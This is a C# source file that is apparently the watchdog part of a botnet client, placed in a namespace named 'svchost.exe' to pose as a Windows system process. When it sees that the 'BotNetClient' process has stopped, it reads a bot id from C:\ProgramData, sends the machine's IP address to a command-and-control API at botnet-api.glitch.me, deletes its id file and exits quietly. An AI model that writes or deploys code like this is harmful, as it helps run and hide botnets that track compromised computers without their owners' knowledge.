using System.Linq;
using System.Diagnostics;
using System.IO;
using System;
using System.Net.Http;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Web.Script.Serialization;

namespace svchost.exe
{
    public class Response
    {
        public string ip { get; set; }
        public string response { get; set; }
    }
    class Program
    {
        static async Task<HttpResponseMessage> SendAsync(string Ip)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            Response response = new Response
            {
                ip = Ip,
                response = Ip + "    Disconneted"
            };
            string json = new JavaScriptSerializer().Serialize(response);
            HttpResponseMessage response2 = await client.PostAsync($"/api/v1/responses/{Ip}", new StringContent(json));
            return response2;
        }
        static async Task<HttpResponseMessage> Delete(uint id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            HttpResponseMessage res = await client.DeleteAsync($"/api/v1/ip/{id}");
            return res;
        }
        static void Main(string[] args)
        {
            try
            {
                IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
                IPAddress ipaddress = iphostinfo.AddressList[0];
                String pth = "System.Diagnostics.Process (BotNetClient)";
                Thread.Sleep(1000);
                string id;
                var processes = Process.GetProcesses();
                string[] proc = new string[processes.Length];
                for (int i = 0; i < processes.Length; i++)
                {
                    proc[i] = processes[i].ToString();
                }
                while (true)
                {
                    if (Array.IndexOf(proc, pth) >= 0)
                    {
                        Array.Clear(processes, 0, processes.Length);
                        processes = Process.GetProcesses();
                        Array.Clear(proc, 0, proc.Length);
                        proc = new string[processes.Length];
                        for (int i = 0; i < processes.Length; i++)
                        {
                            proc[i] = processes[i].ToString();
                        }
                        continue;
                    }
                    else
                    {
                        id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
                        var resd = Delete(Convert.ToUInt32(id)).Result;
                        Thread.Sleep(1000);
                        var res = SendAsync(ipaddress.ToString()).Result;
                        File.Delete("C:\\ProgramData\\idbtc.txt");
                        throw new Exception();
                    }
                }
            }
            catch (Exception)
            {
                Environment.Exit(0);
            }
        }
    }
}
